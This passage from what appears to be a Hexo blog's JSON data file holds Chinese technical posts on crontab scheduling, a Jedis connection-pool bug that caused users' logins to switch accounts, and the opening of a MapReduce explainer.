title=\"&#x4E09;&#x3001;crontab\"></a>&#x4E09;&#x3001;crontab</h3><p>&#x901A;&#x8FC7;crontab&#x53EF;&#x4EE5;&#x8BBE;&#x5B9A;&#x7A0B;&#x5E8F;&#x7684;&#x6267;&#x884C;&#x65F6;&#x95F4;&#x8868;&#xFF0C;&#x4F8B;&#x5982;&#x8BA9;&#x7A0B;&#x5E8F;&#x5728;&#x6BCF;&#x5929;&#x7684;8&#x70B9;&#xFF0C;&#x6216;&#x8005;&#x6BCF;&#x4E2A;&#x661F;&#x671F;&#x4E00;&#x7684;10&#x70B9;&#x6267;&#x884C;&#x4E00;&#x6B21;&#x3002;<br>crontab -l &#x5217;&#x51FA;&#x65F6;&#x95F4;&#x8868;&#xFF1B;<br>crontab -e&#x7F16;&#x8F91;&#x65F6;&#x95F4;&#x8868;&#xFF1B;<br>crontab -d&#x5220;&#x9664;&#x65F6;&#x95F4;&#x8868;&#xFF1B;</p>\n<p>&#x201C;-l&#x201D;&#x5C31;&#x662F;&#x4E00;&#x4E2A;&#x67E5;&#x770B;&#x800C;&#x5DF2;&#xFF1B;<br>&#x201C;-e&#x201D;&#x662F;&#x7F16;&#x8F91;&#xFF0C;&#x548C;vi&#x6CA1;&#x4EC0;&#x4E48;&#x5DEE;&#x522B;&#xFF08;&#x5176;&#x5B9E;&#x5C31;&#x662F;&#x7528;vi&#x7F16;&#x8F91;&#x4E00;&#x4E2A;&#x7279;&#x5B9A;&#x6587;&#x4EF6;&#xFF09;&#xFF1B;<br>&#x201C;-d&#x201D;&#x57FA;&#x672C;&#x4E0D;&#x7528;&#xFF0C;&#x56E0;&#x4E3A;&#x5B83;&#x628A;&#x8BE5;&#x7528;&#x6237;&#x6240;&#x6709;&#x7684;&#x65F6;&#x95F4;&#x8868;&#x90FD;&#x5220;&#x9664;&#x4E86;&#xFF0C;&#x4E00;&#x822C;&#x90FD;&#x662F;&#x7528;&#x201C;-e&#x201D;&#x7F16;&#x8F91;&#x628A;&#x4E0D;&#x8981;&#x4E86;&#x7684;&#x65F6;&#x95F4;&#x8868;&#x9010;&#x884C;&#x5220;&#x9664;&#xFF1B;</p>\n<p>&#x90A3;&#x5230;&#x5E95;&#x8BE5;&#x5982;&#x4F55;&#x7F16;&#x8F91;&#x5462;&#xFF1F;</p>\n<p>crontab&#x6587;&#x4EF6;&#x7684;&#x683C;&#x5F0F;&#x662F;&#xFF1A;M H D m d CMD&#x3002;<br>&#x4E00;&#x4E2A;6&#x4E2A;&#x5B57;&#x6BB5;&#xFF0C;&#x5176;&#x4E2D;&#x6700;&#x540E;&#x4E00;&#x4E2A;CMD&#x5C31;&#x662F;&#x6240;&#x8981;&#x6267;&#x884C;&#x7684;&#x7A0B;&#x5E8F;&#xFF0C;&#x5982;haha.sh&#x3002;<br>M&#xFF1A;&#x5206;&#x949F;&#xFF08;0-59&#xFF09;<br>H&#xFF1A;&#x5C0F;&#x65F6;&#xFF08;0-23&#xFF09;<br>D&#xFF1A;&#x65E5;&#x671F;&#xFF08;1-31&#xFF09;<br>m&#xFF1A;&#x6708;&#x4EFD;&#xFF08;1-12&#xFF09;<br>d&#xFF1A;&#x4E00;&#x4E2A;&#x661F;&#x671F;&#x4E2D;&#x7684;&#x67D0;&#x5929;&#xFF08;0-6&#xFF0C;0&#x4EE3;&#x8868;&#x5468;&#x65E5;&#xFF09;</p>\n<p>&#x8FD9;5&#x4E2A;&#x65F6;&#x95F4;&#x5B57;&#x6BB5;&#x7528;&#x7A7A;&#x683C;&#x9694;&#x5F00;&#xFF0C;&#x5176;&#x503C;&#x53EF;&#x4EE5;&#x662F;&#x4E00;&#x4E2A;&#x6570;&#x5B57;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x7528;&#x9017;&#x53F7;&#x9694;&#x5F00;&#x7684;&#x591A;&#x4E2A;&#x6570;&#x5B57;&#xFF08;&#x6216;&#x5176;&#x4ED6;&#xFF09; &#xFF0C;&#x5982;&#x679C;&#x4E0D;&#x9700;&#x8BBE;&#x7F6E;&#xFF0C;&#x5219;&#x9ED8;&#x8BA4;&#x4E3A;&#x201C;*&#x201D;&#x3002;</p>\n<p>&#x4F8B;&#x5982;&#xFF0C;&#x6BCF;&#x5929;&#x7684;8&#x70B9;5&#x5206;&#x6267;&#x884C;haha.sh&#xFF0C;&#x5C31;&#x662F;&#x201C;5 8 <em> </em> * /opt/./haha.sh&#x201D;&#x3002;</p>\n<p>&#x597D;&#x50CF;&#x548C;&#x201C;&#x5F00;&#x673A;&#x7A0B;&#x5E8F;&#x81EA;&#x52A8;&#x542F;&#x52A8;&#x201D;&#x626F;&#x8FDC;&#x4E86;&#xFF0C;&#x73B0;&#x5728;&#x56DE;&#x5F52;&#x6B63;&#x9898;&#x3002;<br><strong>&#x5176;&#x5B9E;&#x4E0A;&#x9762;&#x4ECB;&#x7ECD;&#x7684;crontab&#x7684;&#x529F;&#x80FD;&#x5DF2;&#x7ECF;&#x5177;&#x5907;&#x4E86;&#x5F00;&#x673A;&#x81EA;&#x52A8;&#x542F;&#x52A8;&#x7684;&#x80FD;&#x529B;&#xFF0C;&#x53EF;&#x4EE5;&#x5199;&#x4E00;&#x4E2A;&#x76D1;&#x6D4B;&#x811A;&#x672C;&#xFF0C;&#x6BCF;5&#x5206;&#x949F;&#x6267;&#x884C;&#x4E00;&#x6B21;&#xFF08;<em>/5 </em> <em> </em> * ./haha.sh&#xFF09;&#xFF0C;&#x5982;&#x679C;&#x7A0B;&#x5E8F;&#x4E0D;&#x5728;&#x4E86;&#x5C31;&#x91CD;&#x65B0;&#x542F;&#x52A8;&#x4E00;&#x6B21;&#x3002;</strong></p>"},{"title":"Jedis-returnResource使用注意事项","date":"2016-06-18T12:10:00.000Z","toc":false,"_content":"\n> 遇到过这样一个严重问题：\n发布的项目不知从什么时候开始，每月会出现一两次串号问题。串号现象指的是，用户用账号A登录系统，然后某个时间，登录账号自动变成了B。\n串号出现的时间不定，测试平台难以重现，且后台检测不到错误，难以定位。当时各种排查，最后发现问题果然是出在缓存redis上，JedisPool使用有问题。\n\n### JedisPool使用注意事项：\n1、每次从pool获取资源后，一定要try-finally释放，否则会出现很多莫名其妙的错误。\n2、资源释放不能一致使用returnBrokenResource【项目问题就出在第二条注意事项上】。\n\n### 相关代码\n代码修改前大致如下:\n```\npublic void closeResource(Jedis jedis) {  \n    if (null != jedis) { \n         jedisPool.returnResource(jedis);  \n    }  \n} \n```\n<!-- more -->\n\n代码修改后大致如下【isOK正常设为true，捕获到异常如JedisConnectionException时传入false】:\n```\npublic void closeResource(Jedis jedis, boolean isOK) {  \n    if (null != jedis) {  \n        if(!isOK){  \n            LOG.error(\"do some things..\");\n            jedisPool.returnBrokenResource(jedis);  \n        }else{  \n            jedisPool.returnResource(jedis);  \n        }   \n    }  \n}  \n```\n相关源码：\n\n![图片1](http://7xvfir.com1.z0.glb.clouddn.com/Jedis-returnResource%E4%BD%BF%E7%94%A8%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9/1.png)\n分析源代码，可以知道本来应该执行returnBrokenResourceObject方法，结果却执行了returnResourceObject，并且执行returnResourceObject过程中没有报错。\n\n具体原因应该就在方法体里面，可惜点进去并没有分析出具体是哪几行代码导致了串号的出现  = =! \n不过当时项目return方面进行了修改后，错误确实没有再出现。\n\n下面这篇文章也讲解了returnSource的相关注意事项，大家可以参考下\n[http://www.codeweblog.com/jedis-returnresource使用注意事项/](http://www.codeweblog.com/jedis-returnresource使用注意事项/)\n\n**PS：**当时项目使用的是Jedis2.7.0，不用通过图片1可以发现Jedis3.0后，returnResource就不使用了，建议用close替换。\n即：jedisPool.returnResource(jedis) ---> jedis.close();\n","source":"_posts/Jedis-returnResource使用注意事项.md","raw":"---\ntitle: Jedis-returnResource使用注意事项\ncategories:\n  - 错误集锦\ntags:\n  - redis\ndate: 2016-6-18 20:10:00\ntoc: false\n\n---\n\n> 遇到过这样一个严重问题：\n发布的项目不知从什么时候开始，每月会出现一两次串号问题。串号现象指的是，用户用账号A登录系统，然后某个时间，登录账号自动变成了B。\n串号出现的时间不定，测试平台难以重现，且后台检测不到错误，难以定位。当时各种排查，最后发现问题果然是出在缓存redis上，JedisPool使用有问题。\n\n### JedisPool使用注意事项：\n1、每次从pool获取资源后，一定要try-finally释放，否则会出现很多莫名其妙的错误。\n2、资源释放不能一致使用returnBrokenResource【项目问题就出在第二条注意事项上】。\n\n### 相关代码\n代码修改前大致如下:\n```\npublic void closeResource(Jedis jedis) {  \n    if (null != jedis) { \n         jedisPool.returnResource(jedis);  \n    }  \n} \n```\n<!-- more -->\n\n代码修改后大致如下【isOK正常设为true，捕获到异常如JedisConnectionException时传入false】:\n```\npublic void closeResource(Jedis jedis, boolean isOK) {  \n    if (null != jedis) {  \n        if(!isOK){  \n            LOG.error(\"do some things..\");\n            jedisPool.returnBrokenResource(jedis);  \n        }else{  \n            jedisPool.returnResource(jedis);  \n        }   \n    }  \n}  \n```\n相关源码：\n\n![图片1](http://7xvfir.com1.z0.glb.clouddn.com/Jedis-returnResource%E4%BD%BF%E7%94%A8%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9/1.png)\n分析源代码，可以知道本来应该执行returnBrokenResourceObject方法，结果却执行了returnResourceObject，并且执行returnResourceObject过程中没有报错。\n\n具体原因应该就在方法体里面，可惜点进去并没有分析出具体是哪几行代码导致了串号的出现  = =! \n不过当时项目return方面进行了修改后，错误确实没有再出现。\n\n下面这篇文章也讲解了returnSource的相关注意事项，大家可以参考下\n[http://www.codeweblog.com/jedis-returnresource使用注意事项/](http://www.codeweblog.com/jedis-returnresource使用注意事项/)\n\n**PS：**当时项目使用的是Jedis2.7.0，不用通过图片1可以发现Jedis3.0后，returnResource就不使用了，建议用close替换。\n即：jedisPool.returnResource(jedis) ---> jedis.close();\n","slug":"Jedis-returnResource使用注意事项","published":1,"updated":"2016-11-17T11:59:42.664Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciwbrulb6000zgwtmp38ff9n6","content":"<blockquote>\n<p>&#x9047;&#x5230;&#x8FC7;&#x8FD9;&#x6837;&#x4E00;&#x4E2A;&#x4E25;&#x91CD;&#x95EE;&#x9898;&#xFF1A;<br>&#x53D1;&#x5E03;&#x7684;&#x9879;&#x76EE;&#x4E0D;&#x77E5;&#x4ECE;&#x4EC0;&#x4E48;&#x65F6;&#x5019;&#x5F00;&#x59CB;&#xFF0C;&#x6BCF;&#x6708;&#x4F1A;&#x51FA;&#x73B0;&#x4E00;&#x4E24;&#x6B21;&#x4E32;&#x53F7;&#x95EE;&#x9898;&#x3002;&#x4E32;&#x53F7;&#x73B0;&#x8C61;&#x6307;&#x7684;&#x662F;&#xFF0C;&#x7528;&#x6237;&#x7528;&#x8D26;&#x53F7;A&#x767B;&#x5F55;&#x7CFB;&#x7EDF;&#xFF0C;&#x7136;&#x540E;&#x67D0;&#x4E2A;&#x65F6;&#x95F4;&#xFF0C;&#x767B;&#x5F55;&#x8D26;&#x53F7;&#x81EA;&#x52A8;&#x53D8;&#x6210;&#x4E86;B&#x3002;<br>&#x4E32;&#x53F7;&#x51FA;&#x73B0;&#x7684;&#x65F6;&#x95F4;&#x4E0D;&#x5B9A;&#xFF0C;&#x6D4B;&#x8BD5;&#x5E73;&#x53F0;&#x96BE;&#x4EE5;&#x91CD;&#x73B0;&#xFF0C;&#x4E14;&#x540E;&#x53F0;&#x68C0;&#x6D4B;&#x4E0D;&#x5230;&#x9519;&#x8BEF;&#xFF0C;&#x96BE;&#x4EE5;&#x5B9A;&#x4F4D;&#x3002;&#x5F53;&#x65F6;&#x5404;&#x79CD;&#x6392;&#x67E5;&#xFF0C;&#x6700;&#x540E;&#x53D1;&#x73B0;&#x95EE;&#x9898;&#x679C;&#x7136;&#x662F;&#x51FA;&#x5728;&#x7F13;&#x5B58;redis&#x4E0A;&#xFF0C;JedisPool&#x4F7F;&#x7528;&#x6709;&#x95EE;&#x9898;&#x3002;</p>\n</blockquote>\n<h3 id=\"JedisPool&#x4F7F;&#x7528;&#x6CE8;&#x610F;&#x4E8B;&#x9879;&#xFF1A;\"><a href=\"#JedisPool&#x4F7F;&#x7528;&#x6CE8;&#x610F;&#x4E8B;&#x9879;&#xFF1A;\" class=\"headerlink\" title=\"JedisPool&#x4F7F;&#x7528;&#x6CE8;&#x610F;&#x4E8B;&#x9879;&#xFF1A;\"></a>JedisPool&#x4F7F;&#x7528;&#x6CE8;&#x610F;&#x4E8B;&#x9879;&#xFF1A;</h3><p>1&#x3001;&#x6BCF;&#x6B21;&#x4ECE;pool&#x83B7;&#x53D6;&#x8D44;&#x6E90;&#x540E;&#xFF0C;&#x4E00;&#x5B9A;&#x8981;try-finally&#x91CA;&#x653E;&#xFF0C;&#x5426;&#x5219;&#x4F1A;&#x51FA;&#x73B0;&#x5F88;&#x591A;&#x83AB;&#x540D;&#x5176;&#x5999;&#x7684;&#x9519;&#x8BEF;&#x3002;<br>2&#x3001;&#x8D44;&#x6E90;&#x91CA;&#x653E;&#x4E0D;&#x80FD;&#x4E00;&#x81F4;&#x4F7F;&#x7528;returnBrokenResource&#x3010;&#x9879;&#x76EE;&#x95EE;&#x9898;&#x5C31;&#x51FA;&#x5728;&#x7B2C;&#x4E8C;&#x6761;&#x6CE8;&#x610F;&#x4E8B;&#x9879;&#x4E0A;&#x3011;&#x3002;</p>\n<h3 id=\"&#x76F8;&#x5173;&#x4EE3;&#x7801;\"><a href=\"#&#x76F8;&#x5173;&#x4EE3;&#x7801;\" class=\"headerlink\" title=\"&#x76F8;&#x5173;&#x4EE3;&#x7801;\"></a>&#x76F8;&#x5173;&#x4EE3;&#x7801;</h3><p>&#x4EE3;&#x7801;&#x4FEE;&#x6539;&#x524D;&#x5927;&#x81F4;&#x5982;&#x4E0B;:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public void closeResource(Jedis jedis) {  </span><br><span class=\"line\">    if (null != jedis) { </span><br><span class=\"line\">         jedisPool.returnResource(jedis);  </span><br><span class=\"line\">    }  </span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure></p>\n<a id=\"more\"></a>\n<p>&#x4EE3;&#x7801;&#x4FEE;&#x6539;&#x540E;&#x5927;&#x81F4;&#x5982;&#x4E0B;&#x3010;isOK&#x6B63;&#x5E38;&#x8BBE;&#x4E3A;true&#xFF0C;&#x6355;&#x83B7;&#x5230;&#x5F02;&#x5E38;&#x5982;JedisConnectionException&#x65F6;&#x4F20;&#x5165;false&#x3011;:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public void closeResource(Jedis jedis, boolean isOK) {  </span><br><span class=\"line\">    if (null != jedis) {  </span><br><span class=\"line\">        if(!isOK){  </span><br><span class=\"line\">            LOG.error(&quot;do some things..&quot;);</span><br><span class=\"line\">            jedisPool.returnBrokenResource(jedis);  </span><br><span class=\"line\">        }else{  </span><br><span class=\"line\">            jedisPool.returnResource(jedis);  </span><br><span class=\"line\">        }   </span><br><span class=\"line\">    }  </span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure></p>\n<p>&#x76F8;&#x5173;&#x6E90;&#x7801;&#xFF1A;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/Jedis-returnResource%E4%BD%BF%E7%94%A8%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9/1.png\" alt=\"&#x56FE;&#x7247;1\"><br>&#x5206;&#x6790;&#x6E90;&#x4EE3;&#x7801;&#xFF0C;&#x53EF;&#x4EE5;&#x77E5;&#x9053;&#x672C;&#x6765;&#x5E94;&#x8BE5;&#x6267;&#x884C;returnBrokenResourceObject&#x65B9;&#x6CD5;&#xFF0C;&#x7ED3;&#x679C;&#x5374;&#x6267;&#x884C;&#x4E86;returnResourceObject&#xFF0C;&#x5E76;&#x4E14;&#x6267;&#x884C;returnResourceObject&#x8FC7;&#x7A0B;&#x4E2D;&#x6CA1;&#x6709;&#x62A5;&#x9519;&#x3002;</p>\n<p>&#x5177;&#x4F53;&#x539F;&#x56E0;&#x5E94;&#x8BE5;&#x5C31;&#x5728;&#x65B9;&#x6CD5;&#x4F53;&#x91CC;&#x9762;&#xFF0C;&#x53EF;&#x60DC;&#x70B9;&#x8FDB;&#x53BB;&#x5E76;&#x6CA1;&#x6709;&#x5206;&#x6790;&#x51FA;&#x5177;&#x4F53;&#x662F;&#x54EA;&#x51E0;&#x884C;&#x4EE3;&#x7801;&#x5BFC;&#x81F4;&#x4E86;&#x4E32;&#x53F7;&#x7684;&#x51FA;&#x73B0;  = =!<br>&#x4E0D;&#x8FC7;&#x5F53;&#x65F6;&#x9879;&#x76EE;return&#x65B9;&#x9762;&#x8FDB;&#x884C;&#x4E86;&#x4FEE;&#x6539;&#x540E;&#xFF0C;&#x9519;&#x8BEF;&#x786E;&#x5B9E;&#x6CA1;&#x6709;&#x518D;&#x51FA;&#x73B0;&#x3002;</p>\n<p>&#x4E0B;&#x9762;&#x8FD9;&#x7BC7;&#x6587;&#x7AE0;&#x4E5F;&#x8BB2;&#x89E3;&#x4E86;returnSource&#x7684;&#x76F8;&#x5173;&#x6CE8;&#x610F;&#x4E8B;&#x9879;&#xFF0C;&#x5927;&#x5BB6;&#x53EF;&#x4EE5;&#x53C2;&#x8003;&#x4E0B;<br><a href=\"http://www.codeweblog.com/jedis-returnresource&#x4F7F;&#x7528;&#x6CE8;&#x610F;&#x4E8B;&#x9879;/\" target=\"_blank\" rel=\"external\">http://www.codeweblog.com/jedis-returnresource&#x4F7F;&#x7528;&#x6CE8;&#x610F;&#x4E8B;&#x9879;/</a></p>\n<p><strong>PS&#xFF1A;</strong>&#x5F53;&#x65F6;&#x9879;&#x76EE;&#x4F7F;&#x7528;&#x7684;&#x662F;Jedis2.7.0&#xFF0C;&#x4E0D;&#x7528;&#x901A;&#x8FC7;&#x56FE;&#x7247;1&#x53EF;&#x4EE5;&#x53D1;&#x73B0;Jedis3.0&#x540E;&#xFF0C;returnResource&#x5C31;&#x4E0D;&#x4F7F;&#x7528;&#x4E86;&#xFF0C;&#x5EFA;&#x8BAE;&#x7528;close&#x66FF;&#x6362;&#x3002;<br>&#x5373;&#xFF1A;jedisPool.returnResource(jedis) &#x2014;&gt; jedis.close();</p>\n","excerpt":"<blockquote>\n<p>&#x9047;&#x5230;&#x8FC7;&#x8FD9;&#x6837;&#x4E00;&#x4E2A;&#x4E25;&#x91CD;&#x95EE;&#x9898;&#xFF1A;<br>&#x53D1;&#x5E03;&#x7684;&#x9879;&#x76EE;&#x4E0D;&#x77E5;&#x4ECE;&#x4EC0;&#x4E48;&#x65F6;&#x5019;&#x5F00;&#x59CB;&#xFF0C;&#x6BCF;&#x6708;&#x4F1A;&#x51FA;&#x73B0;&#x4E00;&#x4E24;&#x6B21;&#x4E32;&#x53F7;&#x95EE;&#x9898;&#x3002;&#x4E32;&#x53F7;&#x73B0;&#x8C61;&#x6307;&#x7684;&#x662F;&#xFF0C;&#x7528;&#x6237;&#x7528;&#x8D26;&#x53F7;A&#x767B;&#x5F55;&#x7CFB;&#x7EDF;&#xFF0C;&#x7136;&#x540E;&#x67D0;&#x4E2A;&#x65F6;&#x95F4;&#xFF0C;&#x767B;&#x5F55;&#x8D26;&#x53F7;&#x81EA;&#x52A8;&#x53D8;&#x6210;&#x4E86;B&#x3002;<br>&#x4E32;&#x53F7;&#x51FA;&#x73B0;&#x7684;&#x65F6;&#x95F4;&#x4E0D;&#x5B9A;&#xFF0C;&#x6D4B;&#x8BD5;&#x5E73;&#x53F0;&#x96BE;&#x4EE5;&#x91CD;&#x73B0;&#xFF0C;&#x4E14;&#x540E;&#x53F0;&#x68C0;&#x6D4B;&#x4E0D;&#x5230;&#x9519;&#x8BEF;&#xFF0C;&#x96BE;&#x4EE5;&#x5B9A;&#x4F4D;&#x3002;&#x5F53;&#x65F6;&#x5404;&#x79CD;&#x6392;&#x67E5;&#xFF0C;&#x6700;&#x540E;&#x53D1;&#x73B0;&#x95EE;&#x9898;&#x679C;&#x7136;&#x662F;&#x51FA;&#x5728;&#x7F13;&#x5B58;redis&#x4E0A;&#xFF0C;JedisPool&#x4F7F;&#x7528;&#x6709;&#x95EE;&#x9898;&#x3002;</p>\n</blockquote>\n<h3 id=\"JedisPool&#x4F7F;&#x7528;&#x6CE8;&#x610F;&#x4E8B;&#x9879;&#xFF1A;\"><a href=\"#JedisPool&#x4F7F;&#x7528;&#x6CE8;&#x610F;&#x4E8B;&#x9879;&#xFF1A;\" class=\"headerlink\" title=\"JedisPool&#x4F7F;&#x7528;&#x6CE8;&#x610F;&#x4E8B;&#x9879;&#xFF1A;\"></a>JedisPool&#x4F7F;&#x7528;&#x6CE8;&#x610F;&#x4E8B;&#x9879;&#xFF1A;</h3><p>1&#x3001;&#x6BCF;&#x6B21;&#x4ECE;pool&#x83B7;&#x53D6;&#x8D44;&#x6E90;&#x540E;&#xFF0C;&#x4E00;&#x5B9A;&#x8981;try-finally&#x91CA;&#x653E;&#xFF0C;&#x5426;&#x5219;&#x4F1A;&#x51FA;&#x73B0;&#x5F88;&#x591A;&#x83AB;&#x540D;&#x5176;&#x5999;&#x7684;&#x9519;&#x8BEF;&#x3002;<br>2&#x3001;&#x8D44;&#x6E90;&#x91CA;&#x653E;&#x4E0D;&#x80FD;&#x4E00;&#x81F4;&#x4F7F;&#x7528;returnBrokenResource&#x3010;&#x9879;&#x76EE;&#x95EE;&#x9898;&#x5C31;&#x51FA;&#x5728;&#x7B2C;&#x4E8C;&#x6761;&#x6CE8;&#x610F;&#x4E8B;&#x9879;&#x4E0A;&#x3011;&#x3002;</p>\n<h3 id=\"&#x76F8;&#x5173;&#x4EE3;&#x7801;\"><a href=\"#&#x76F8;&#x5173;&#x4EE3;&#x7801;\" class=\"headerlink\" title=\"&#x76F8;&#x5173;&#x4EE3;&#x7801;\"></a>&#x76F8;&#x5173;&#x4EE3;&#x7801;</h3><p>&#x4EE3;&#x7801;&#x4FEE;&#x6539;&#x524D;&#x5927;&#x81F4;&#x5982;&#x4E0B;:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public void closeResource(Jedis jedis) {  </span><br><span class=\"line\">    if (null != jedis) { </span><br><span class=\"line\">         jedisPool.returnResource(jedis);  </span><br><span class=\"line\">    }  </span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure></p>","more":"<p>&#x4EE3;&#x7801;&#x4FEE;&#x6539;&#x540E;&#x5927;&#x81F4;&#x5982;&#x4E0B;&#x3010;isOK&#x6B63;&#x5E38;&#x8BBE;&#x4E3A;true&#xFF0C;&#x6355;&#x83B7;&#x5230;&#x5F02;&#x5E38;&#x5982;JedisConnectionException&#x65F6;&#x4F20;&#x5165;false&#x3011;:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public void closeResource(Jedis jedis, boolean isOK) {  </span><br><span class=\"line\">    if (null != jedis) {  </span><br><span class=\"line\">        if(!isOK){  </span><br><span class=\"line\">            LOG.error(&quot;do some things..&quot;);</span><br><span class=\"line\">            jedisPool.returnBrokenResource(jedis);  </span><br><span class=\"line\">        }else{  </span><br><span class=\"line\">            jedisPool.returnResource(jedis);  </span><br><span class=\"line\">        }   </span><br><span class=\"line\">    }  </span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure></p>\n<p>&#x76F8;&#x5173;&#x6E90;&#x7801;&#xFF1A;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/Jedis-returnResource%E4%BD%BF%E7%94%A8%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9/1.png\" alt=\"&#x56FE;&#x7247;1\"><br>&#x5206;&#x6790;&#x6E90;&#x4EE3;&#x7801;&#xFF0C;&#x53EF;&#x4EE5;&#x77E5;&#x9053;&#x672C;&#x6765;&#x5E94;&#x8BE5;&#x6267;&#x884C;returnBrokenResourceObject&#x65B9;&#x6CD5;&#xFF0C;&#x7ED3;&#x679C;&#x5374;&#x6267;&#x884C;&#x4E86;returnResourceObject&#xFF0C;&#x5E76;&#x4E14;&#x6267;&#x884C;returnResourceObject&#x8FC7;&#x7A0B;&#x4E2D;&#x6CA1;&#x6709;&#x62A5;&#x9519;&#x3002;</p>\n<p>&#x5177;&#x4F53;&#x539F;&#x56E0;&#x5E94;&#x8BE5;&#x5C31;&#x5728;&#x65B9;&#x6CD5;&#x4F53;&#x91CC;&#x9762;&#xFF0C;&#x53EF;&#x60DC;&#x70B9;&#x8FDB;&#x53BB;&#x5E76;&#x6CA1;&#x6709;&#x5206;&#x6790;&#x51FA;&#x5177;&#x4F53;&#x662F;&#x54EA;&#x51E0;&#x884C;&#x4EE3;&#x7801;&#x5BFC;&#x81F4;&#x4E86;&#x4E32;&#x53F7;&#x7684;&#x51FA;&#x73B0;  = =!<br>&#x4E0D;&#x8FC7;&#x5F53;&#x65F6;&#x9879;&#x76EE;return&#x65B9;&#x9762;&#x8FDB;&#x884C;&#x4E86;&#x4FEE;&#x6539;&#x540E;&#xFF0C;&#x9519;&#x8BEF;&#x786E;&#x5B9E;&#x6CA1;&#x6709;&#x518D;&#x51FA;&#x73B0;&#x3002;</p>\n<p>&#x4E0B;&#x9762;&#x8FD9;&#x7BC7;&#x6587;&#x7AE0;&#x4E5F;&#x8BB2;&#x89E3;&#x4E86;returnSource&#x7684;&#x76F8;&#x5173;&#x6CE8;&#x610F;&#x4E8B;&#x9879;&#xFF0C;&#x5927;&#x5BB6;&#x53EF;&#x4EE5;&#x53C2;&#x8003;&#x4E0B;<br><a href=\"http://www.codeweblog.com/jedis-returnresource&#x4F7F;&#x7528;&#x6CE8;&#x610F;&#x4E8B;&#x9879;/\">http://www.codeweblog.com/jedis-returnresource&#x4F7F;&#x7528;&#x6CE8;&#x610F;&#x4E8B;&#x9879;/</a></p>\n<p><strong>PS&#xFF1A;</strong>&#x5F53;&#x65F6;&#x9879;&#x76EE;&#x4F7F;&#x7528;&#x7684;&#x662F;Jedis2.7.0&#xFF0C;&#x4E0D;&#x7528;&#x901A;&#x8FC7;&#x56FE;&#x7247;1&#x53EF;&#x4EE5;&#x53D1;&#x73B0;Jedis3.0&#x540E;&#xFF0C;returnResource&#x5C31;&#x4E0D;&#x4F7F;&#x7528;&#x4E86;&#xFF0C;&#x5EFA;&#x8BAE;&#x7528;close&#x66FF;&#x6362;&#x3002;<br>&#x5373;&#xFF1A;jedisPool.returnResource(jedis) &#x2014;&gt; jedis.close();</p>"},{"title":"MapReduce详解","date":"2016-05-17T13:18:00.000Z","_content":"\n### MapReduce\nMapReduce是一种编程模型，用于大规模数据集（大于1TB）的并行运算。概念\"Map（映射）\"和\"Reduce（归约）\"，是它们的主要思想，都是从函数式编程语言里借来的，还有从矢量编程语言里借来的特性。**它极大地方便了编程人员在不会分布式并行编程的情况下，将自己的程序运行在分布式系统上。**\n\n### 分析MapReduce执行过程\n\nMapReduce运行的时候，会通过Mapper运行的任务读取HDFS中的数据文件，然后调用自己的方法，处理数据，最后输出。Reducer任务会接收Mapper任务输出的数据，作为自己的输入数据，调用自己的方法，最后输出到HDFS的文件中。整个流程如图：\n\n![](http://7xvfir.com1.z0.glb.clouddn.com/MapReduce%E8%AF%A6%E8%A7%A3/1.png)\n\n- - -\n### Mapper任务详解\n\n**每个Mapper任务是一个java进程**，它会读取HDFS中的文件，解析成很多的键值对，经过我们覆盖的map方法处理后，转换为很多的键值对再输出。整个Mapper任务的处理过程又可以分为以下几个阶段，如图所示。\n\n<!-- more -->\n\n![](http://7xvfir.com1.z0.glb.clouddn.com/MapReduce%E8%AF%A6%E8%A7%A3/2.png)\n\n在上图中，把Mapper任务的运行过程分为六个阶段。\n\n- 第一阶段是把输入文件按照一定的标准进行分片(InputSplit)，每个输入片的大小是固定的。默认情况下，输入片(InputSplit)的大小与数据块(Block)的大小是相同的。如果数据块(Block)的大小是默认值64MB，输入文件有两个，一个是32MB，一个是72MB。那么小的文件是一个输入片，大文件会分为两个数据块，那么是两个输入片。一共产生三个输入片。**每一个输入片由一个Mapper进程处理**。这里的三个输入片，会有三个Mapper进程处理。\n\n- 第二阶段是对输入片中的记录按照一定的规则解析成键值对。有个默认规则是把每一行文本内容解析成键值对。“键”是每一行的起始位置(单位是字节)，“值”是本行的文本内容。\n\n- 第三阶段是调用Mapper类中的map方法。第二阶段中解析出来的每一个键值对，调用一次map方法。如果有1000个键值对，就会调用1000次map方法。每一次调用map方法会输出零个或者多个键值对。\n\n- 